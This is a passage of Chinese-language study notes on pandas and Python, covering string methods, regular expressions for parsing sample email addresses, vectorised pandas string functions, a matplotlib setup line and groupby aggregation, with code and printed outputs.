<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">values = np.random.rand(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> values</span><br><span class="line"></span><br><span class="line">bins = [<span class="number">0</span>, <span class="number">0.2</span>, <span class="number">0.4</span>, <span class="number">0.6</span>, <span class="number">0.8</span>, <span class="number">1.</span>]</span><br><span class="line"><span class="keyword">print</span> pd.get_dummies(pd.cut(values, bins))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[ 0.48344916  0.11734259  0.07557764  0.21863608  0.90953758  0.38441329</span><br><span class="line">  0.08127486  0.95663486  0.04387138  0.14476865]</span><br><span class="line">   (0, 0.2]  (0.2, 0.4]  (0.4, 0.6]  (0.6, 0.8]  (0.8, 1]</span><br><span class="line">0       0.0         0.0         1.0         0.0       0.0</span><br><span class="line">1       1.0         0.0         0.0         0.0       0.0</span><br><span class="line">2       1.0         0.0         0.0         0.0       0.0</span><br><span class="line">3       0.0         1.0         0.0         0.0       0.0</span><br><span class="line">4       0.0         0.0         0.0         0.0       1.0</span><br><span class="line">5       0.0         1.0         0.0         0.0       0.0</span><br><span class="line">6       1.0         0.0         0.0         0.0       0.0</span><br><span class="line">7       0.0         0.0         0.0         0.0       1.0</span><br><span class="line">8       1.0         0.0         0.0         0.0       0.0</span><br><span class="line">9       1.0         0.0         0.0         0.0       0.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><h3 id="字符串对象方法"><a href="#字符串对象方法" class="headerlink" title="字符串对象方法"></a>字符串对象方法</h3><ol>
<li><p>一些处理方法例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">val = <span class="string">'a,b,  guido'</span></span><br><span class="line"><span class="keyword">print</span>  val.split(<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结合 strip(用于修剪空白符(包括换行符))一起使用</span></span><br><span class="line">pieces = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> val.split(<span class="string">','</span>)]</span><br><span class="line"><span class="keyword">print</span> pieces</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用加法，可以将这些子字符串以双冒号分隔符的形式连接起来</span></span><br><span class="line">first, second, third = pieces</span><br><span class="line"><span class="keyword">print</span> first + <span class="string">'::'</span> + second + <span class="string">"::"</span> + third</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#但是这种不很实用，一种更快的ptyhon方法就是</span></span><br><span class="line"><span class="comment">#向字符串"::"的join方法传入一个列表或者元组</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"::"</span>.join(pieces)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#另一个方法就是子串定位，检测子串的最佳方式是利用python的in关键字(index和find也可以用)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'guido'</span> <span class="keyword">in</span> val</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> val.index(<span class="string">','</span>) <span class="comment"># 找不到会引发异常</span></span><br><span class="line"><span class="keyword">print</span> val.find(<span class="string">':'</span>) <span class="comment"># 找不到会返回-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#count返回指定子串出现的次数</span></span><br><span class="line"><span class="keyword">print</span> val.count(<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#repalce用于将指定模式替换另一种模式，</span></span><br><span class="line"><span class="comment">#常用于删除模式： 传入空字符串</span></span><br><span class="line"><span class="keyword">print</span> val.replace(<span class="string">','</span>, <span class="string">'::'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> val.replace(<span class="string">','</span>, <span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[&apos;a&apos;, &apos;b&apos;, &apos;  guido&apos;]</span><br><span class="line">[&apos;a&apos;, &apos;b&apos;, &apos;guido&apos;]</span><br><span class="line"></span><br><span class="line">a::b::guido</span><br><span class="line"></span><br><span class="line">a::b::guido</span><br><span class="line"></span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-1</span><br><span class="line">2</span><br><span class="line">a::b::  guido</span><br><span class="line"></span><br><span class="line">ab  guido</span><br></pre></td></tr></table></figure>
</li>
<li><p>Python 内置的字符串方法</p>
<p>|      方法               |     说明           |<br>|—————————|—————————————————————————————-|<br>| count               | 返回子串在字符串中的出现次数(非重叠)                                 |<br>| endswith startswith | 如果字符串以某个后缀结尾(开头)，则返回True                           |<br>| join                | 将字符串用于连接其他字符串序列的分隔符                               |<br>| index               | 如果在字符串中找到子串，则返回子串第一个字符所在的位置               |<br>|                     | 如果没有找到，则引发VauleError                                       |<br>| find                | 如果在字符串中找到子串，则返回第一个发现子串的第一个字符的位置       |<br>|                     | 如果没有找到，则返回-1                                               |<br>| rfind               | 如果在字符串中找到子串，则返回最后一个发现的子串的第一字符所在的位置 |<br>|                     | 如果没有找到，则返回-1                                               |<br>| raplace             | 用另一个字符串替换指定子串                                           |<br>| strip rstrip lstrip | 去除空白符(包括换行符)                                               |<br>|                     | 相当于对个元素执行了x.strip() (以及rstrip lstrip)                    |<br>| split               | 通过指定的分隔符将字符串拆分为一组子串                               |<br>| lower upper         | 将字符转换成小写或大写                                               |<br>| ljust rjust         | 用空格(或其他字符)填充字符串的空白侧以返回符合的最低宽度字符串       |</p>
</li>
</ol>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="re模块的函数分为三大块"><a href="#re模块的函数分为三大块" class="headerlink" title="re模块的函数分为三大块"></a>re模块的函数分为三大块</h3><ul>
<li>模式匹配</li>
<li>替换</li>
<li>拆分</li>
</ul>
<ol>
<li><p>拆分例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">"foo   bar\t baz \tqux"</span></span><br><span class="line"><span class="keyword">print</span> re.split(<span class="string">'\s+'</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以先编译regex以得到一个可重用的regex对象</span></span><br><span class="line">regex = re.compile(<span class="string">'\s+'</span>)</span><br><span class="line"><span class="keyword">print</span> regex.split(text)</span><br><span class="line"><span class="comment"># 如果只想得到匹配regex的所有模式，则可以用findall方法</span></span><br><span class="line"><span class="keyword">print</span> regex.findall(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&apos;foo&apos;, &apos;bar&apos;, &apos;baz&apos;, &apos;qux&apos;]</span><br><span class="line">[&apos;foo&apos;, &apos;bar&apos;, &apos;baz&apos;, &apos;qux&apos;]</span><br><span class="line">[&apos;   &apos;, &apos;\t &apos;, &apos; \t&apos;]</span><br></pre></td></tr></table></figure>
<ol>
<li><p>因为re.split自带先re.compile之后在拆分</p>
</li>
<li><p>对于许多字符串使用同一正则表达式，先通过re.compile创建regex对象，更节省时间</p>
</li>
</ol>
</li>
<li><p>match search findall 之间的不同</p>
<ol>
<li><p>findall会返回字符串中所有的匹配项</p>
</li>
<li><p>search返回第一个匹配项</p>
</li>
<li><p>match更严格，只匹配字符串的首部</p>
</li>
<li><p>区别例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"""Dave dave@google.com</span></span><br><span class="line"><span class="string">Steve steve@gmail.com</span></span><br><span class="line"><span class="string">Rob rob@gmail.com</span></span><br><span class="line"><span class="string">Ryan ryan@yahoo.com"""</span></span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r'[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]&#123;2,4&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># re.IGNORECASS的作用是使正则表达式对大小写不敏感</span></span><br><span class="line">regex = re.compile(pattern, flags = re.IGNORECASE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对text使用findall打到 一组电子邮件地址</span></span><br><span class="line"><span class="keyword">print</span> regex.findall(text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#search匹配字一个地址</span></span><br><span class="line"><span class="comment"># m 是个对象</span></span><br><span class="line">m = regex.search(text)</span><br><span class="line"><span class="keyword">print</span> text[m.start(): m.end()]</span><br><span class="line"></span><br><span class="line"><span class="comment">#regex.match将返回None,因为他只匹配字符串开头</span></span><br><span class="line"><span class="keyword">print</span> regex.match(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&apos;dave@google.com&apos;, &apos;steve@gmail.com&apos;, &apos;rob@gmail.com&apos;, &apos;ryan@yahoo.com&apos;]</span><br><span class="line">dave@google.com</span><br><span class="line">None</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>sub方法 会将匹配到的模式替换成指定字符串，返回得到的新字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> regex.sub(<span class="string">'REDACTED'</span>, text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dave REDACTED</span><br><span class="line">Steve REDACTED</span><br><span class="line">Rob REDACTED</span><br><span class="line">Ryan REDACTED</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果不止找出数据(电子邮件地址)，还要将数据分成几部分(列如 用户名<br>域名 域后缀)</p>
<ol>
<li><p>将待分段的模式的各部分用圆括号包起来即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r'([A-Z0-9._%+-]+)@([A-Z0-9.-]+)\.([A-Z]&#123;2,4&#125;)'</span></span><br><span class="line">regex = re.compile(pattern, flags = re.IGNORECASE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以通过groups方法返回一个由模式各段组成的元组</span></span><br><span class="line">m = regex.match(<span class="string">'wesm@bright.net'</span>)</span><br><span class="line"><span class="keyword">print</span> m.groups()</span><br><span class="line"></span><br><span class="line"><span class="comment">#对于findall会返回一个元组列表</span></span><br><span class="line"><span class="keyword">print</span> regex.findall(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&apos;wesm&apos;, &apos;bright&apos;, &apos;net&apos;)</span><br><span class="line">[(&apos;dave&apos;, &apos;google&apos;, &apos;com&apos;), (&apos;steve&apos;, &apos;gmail&apos;, &apos;com&apos;), (&apos;rob&apos;, &apos;gmail&apos;, &apos;com&apos;), (&apos;ryan&apos;, &apos;yahoo&apos;, &apos;com&apos;)]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>sub还能通过诸如\\1 \\2之类的特殊符号访问各匹配项中的分组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> regex.sub(<span class="string">r'Username: \1, Domain: \2, Sufix : \3'</span>,text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dave Username: dave, Domain: google, Sufix : com</span><br><span class="line">Steve Username: steve, Domain: gmail, Sufix : com</span><br><span class="line">Rob Username: rob, Domain: gmail, Sufix : com</span><br><span class="line">Ryan Username: ryan, Domain: yahoo, Sufix : com</span><br></pre></td></tr></table></figure>
</li>
<li><p>正则扩展</p>
<ol>
<li><p>为各个匹配分组加上一个名字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">regex = re.compile(<span class="string">r"""</span></span><br><span class="line"><span class="string">(?P&lt;username&gt;[A-Z0-9._%+-]+)</span></span><br><span class="line"><span class="string">@</span></span><br><span class="line"><span class="string">(?P&lt;domain&gt;[A-Z0-9.-]+)</span></span><br><span class="line"><span class="string">\.</span></span><br><span class="line"><span class="string">(?P&lt;suffix&gt;[A-Z]&#123;2,4&#125;)"""</span>, flags = re.IGNORECASE|re.VERBOSE)</span><br><span class="line"></span><br><span class="line">m = regex.match(<span class="string">'wesm@bright.net'</span>)</span><br><span class="line"><span class="comment">#这种正则表达式所产生的匹配项对象可以得到一个简单易用的带有分组名称的字典</span></span><br><span class="line"><span class="keyword">print</span> m.groupdict()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;username&apos;: &apos;wesm&apos;, &apos;domain&apos;: &apos;bright&apos;, &apos;suffix&apos;: &apos;net&apos;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h3 id="正则表达式方法"><a href="#正则表达式方法" class="headerlink" title="正则表达式方法"></a>正则表达式方法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>findall finditer</td>
<td>返回字符串中所有的非重叠匹配模式</td>
</tr>
<tr>
<td></td>
<td>findall返回所有模式组成的列表</td>
</tr>
<tr>
<td></td>
<td>finditer返回一个迭代器逐个返回</td>
</tr>
<tr>
<td>match</td>
<td>从字符串起始位置匹配，还可以对模式各部分分组</td>
</tr>
<tr>
<td></td>
<td>如果匹配到模式，则返回一个匹配项对象，否则返回None</td>
</tr>
<tr>
<td>search</td>
<td>如果找到返回第一个匹配对象</td>
</tr>
<tr>
<td></td>
<td>与match不同，其可以位于字符串的任意位置，而不仅仅是起始处</td>
</tr>
<tr>
<td>split</td>
<td>根据找到的字符串拆分成数段</td>
</tr>
<tr>
<td>sub subn</td>
<td>将字符串中所有(sub)或前n个(subn)替换成指定表达式</td>
</tr>
<tr>
<td></td>
<td>在替换字符串中可以通过\\1 \\2等符号表示各分组项</td>
</tr>
</tbody>
</table>
</div>
<h2 id="Pandas中矢量化的字符串函数"><a href="#Pandas中矢量化的字符串函数" class="headerlink" title="Pandas中矢量化的字符串函数"></a>Pandas中矢量化的字符串函数</h2><h3 id="矢量化字符串规整化"><a href="#矢量化字符串规整化" class="headerlink" title="矢量化字符串规整化"></a>矢量化字符串规整化</h3><ol>
<li><p>例子</p>
<ol>
<li><p>处理数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">'Dave'</span>: <span class="string">'dave@google.com'</span>,</span><br><span class="line">        <span class="string">'Steve'</span>: <span class="string">'steve@gmail.com'</span>,</span><br><span class="line">        <span class="string">'Rob'</span>: <span class="string">'rob@gmail.com'</span>,</span><br><span class="line">        <span class="string">'Wes'</span>:np.nan&#125;</span><br><span class="line">data = pd.Series(data)</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Dave     dave@google.com</span><br><span class="line">Rob        rob@gmail.com</span><br><span class="line">Steve    steve@gmail.com</span><br><span class="line">Wes                  NaN</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过data.map,所有字符串和正则方法(传入函数)各个值，但是NA会报错</p>
</li>
<li><p>为了解决这问题，Series有跳过NA值的字符串方法</p>
</li>
<li><p>Series的Str属性可以访问这些方法</p>
<ol>
<li><p>例如通过str.contains检查邮件地址是否含有”gmail”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> data.str.contains(<span class="string">'gmail'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Dave     False</span><br><span class="line">Rob       True</span><br><span class="line">Steve     True</span><br><span class="line">Wes        NaN</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用正则表达式，还可以加上任意re选项(如IGNORECASE)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> pattern</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.str.findall(pattern, flags = re.IGNORECASE)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([A-Z0-9._%+-]+)@([A-Z0-9.-]+)\.([A-Z]&#123;2,4&#125;)</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Dave     [(dave, google, com)]</span><br><span class="line">Rob        [(rob, gmail, com)]</span><br><span class="line">Steve    [(steve, gmail, com)]</span><br><span class="line">Wes                        NaN</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>两种实现矢量化元素获取操作</p>
<ul>
<li>str.get</li>
<li><p>str属性上使用索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">matchs = data.str.match(pattern, flags = re.IGNORECASE)</span><br><span class="line"><span class="keyword">print</span> matchs</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> matchs.str.get(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> matchs.str[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以子串截取 :和书不一样,截取的不是整个字符串，而是分区的数量</span></span><br><span class="line"><span class="keyword">print</span> matchs.str[:<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p>#+begin~example~ Dave (dave, google, com) Rob (rob,<br>gmail, com) Steve (steve, gmail, com) Wes NaN dtype:<br>object</p>
<p>Dave google Rob gmail Steve gmail Wes NaN dtype: object</p>
<p>Dave dave Rob rob Steve steve Wes NaN dtype: object</p>
<p>Dave (dave, google, com) Rob (rob, gmail, com) Steve<br>(steve, gmail, com) Wes NaN dtype: object</p>
</li>
</ul>
<p>#+end~example~</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="矢量化字符串方法"><a href="#矢量化字符串方法" class="headerlink" title="矢量化字符串方法"></a>矢量化字符串方法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>cat</td>
<td>实现元素级的字符串连接操作可指定分隔符</td>
</tr>
<tr>
<td>contains</td>
<td>返回表示各字符串是否含有指定模式的布尔型数组</td>
</tr>
<tr>
<td>count</td>
<td>模式的出现次数</td>
</tr>
<tr>
<td>endswith startswith</td>
<td>相当于对各元素执行x.endswith(pattern)或x.startswith(pattern)</td>
</tr>
<tr>
<td>findall</td>
<td>计算各字符串的模式列表</td>
</tr>
<tr>
<td>get</td>
<td>获取各元素第i个字符</td>
</tr>
<tr>
<td>join</td>
<td>根据指定的分隔符将Series中各元素的字符串连接起来</td>
</tr>
<tr>
<td>len</td>
<td>计算各字符串的长度</td>
</tr>
<tr>
<td>lower upper</td>
<td>转换大小写</td>
</tr>
<tr>
<td>match</td>
<td>根据指定的正则表达式对各元素执行re.match</td>
</tr>
<tr>
<td>pad</td>
<td>在字符串的左边、右边或左右两边天界空白符</td>
</tr>
<tr>
<td>center</td>
<td>相当于pad(side = ‘both’)</td>
</tr>
<tr>
<td>repeat</td>
<td>重复值</td>
</tr>
<tr>
<td></td>
<td>列如s.str.repeat(3)相当于对各个字符串执行x*3</td>
</tr>
<tr>
<td>replace</td>
<td>用指定字符串替换找到的模式</td>
</tr>
<tr>
<td>slice</td>
<td>对Series中的各个字符串进行子串截取</td>
</tr>
<tr>
<td>split</td>
<td>根据分隔符或正则表达式对字符串进行拆分</td>
</tr>
<tr>
<td>strip rstrip lstrip</td>
<td>去除空白符，包括换行符</td>
</tr>
<tr>
<td></td>
<td>相当于对每个元素执行x.strip() x.rstrip() x.strip()</td>
</tr>
</tbody>
</table>
</div>
<h2 id="示例：-USDA食品数据库-待补充-lt-span-gt-示例-usda食品数据库"><a href="#示例：-USDA食品数据库-待补充-lt-span-gt-示例-usda食品数据库" class="headerlink" title="示例： USDA食品数据库 待补充&lt;/span&gt; [示例-usda食品数据库]"></a>示例： USDA食品数据库 <span class="tag" tag-name="待补充"><span class="smallcaps">待补充</span>&lt;/span&gt; [示例-usda食品数据库]</span></h2><h1 id="Chapter-8-绘图和可视化"><a href="#Chapter-8-绘图和可视化" class="headerlink" title="Chapter 8: 绘图和可视化"></a>Chapter 8: 绘图和可视化</h1><h2 id="基本引入约定"><a href="#基本引入约定" class="headerlink" title="基本引入约定"></a>基本引入约定</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure>
<h2 id="Figure和Subplot"><a href="#Figure和Subplot" class="headerlink" title="Figure和Subplot"></a>Figure和Subplot</h2><h3 id="matplotlib的图像都位于Figure对象中，可以使用plt-figure创建新的Figure"><a href="#matplotlib的图像都位于Figure对象中，可以使用plt-figure创建新的Figure" class="headerlink" title="matplotlib的图像都位于Figure对象中，可以使用plt.figure创建新的Figure"></a>matplotlib的图像都位于Figure对象中，可以使用plt.figure创建新的Figure</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fig = plt.figure()</span><br></pre></td></tr></table></figure>
<h1 id="Chapter-9-数据聚合与分组运算"><a href="#Chapter-9-数据聚合与分组运算" class="headerlink" title="Chapter 9: 数据聚合与分组运算"></a>Chapter 9: 数据聚合与分组运算</h1><h2 id="GroupBy技术"><a href="#GroupBy技术" class="headerlink" title="GroupBy技术"></a>GroupBy技术</h2><h3 id="例子-例子-2"><a href="#例子-例子-2" class="headerlink" title="例子 [例子-2]"></a>例子 [例子-2]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'key1'</span>: list(<span class="string">'aabba'</span>),</span><br><span class="line">                   <span class="string">'key2'</span>: [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>],</span><br><span class="line">                   <span class="string">'data1'</span>: np.random.randn(<span class="number">5</span>),</span><br><span class="line">                   <span class="string">'data2'</span>: np.random.randn(<span class="number">5</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> df</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">      data1     data2 key1 key2</span><br><span class="line">0 -1.258749  3.171542    a  one</span><br><span class="line">1 -1.284484  1.429326    a  two</span><br><span class="line">2  0.229799 -0.981352    b  one</span><br><span class="line">3  0.479951 -0.836612    b  two</span><br><span class="line">4  0.043948  0.786918    a  one</span><br></pre></td></tr></table></figure>
<ol>
<li><p>按照key1进行分组，计算data1分组后的平均值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grouped = df[<span class="string">'data1'</span>].groupby(df[<span class="string">'key1'</span>])</span><br><span class="line"><span class="comment"># grouped是groupby的对象</span></span><br><span class="line"><span class="comment">#它实际上还没有进行任何计算，只是含有一些相关分组键df['key']的中间数据</span></span><br><span class="line"><span class="keyword">print</span> grouped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到分组后的平均值</span></span><br><span class="line"><span class="keyword">print</span> grouped.mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;pandas.core.groupby.SeriesGroupBy object at 0x00000000078E2DD8&gt;</span><br><span class="line">key1</span><br><span class="line">a    0.283288</span><br><span class="line">b   -0.677714</span><br><span class="line">Name: data1, dtype: float64</span><br></pre></td></tr></table></figure>
<ol>
<li>数据(Series)根据分组键进行聚合，产生一个新的Series</li>
</ol>
</li>
<li><p>传入多个数组，会得到不同的结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">means = df[<span class="string">'data1'</span>].groupby([df[<span class="string">'key1'</span>], df[<span class="string">'key2'</span>]]).mean()</span><br><span class="line"><span class="keyword">print</span> means</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> means.unstack()</span><br></pre></td></tr></table></figure>
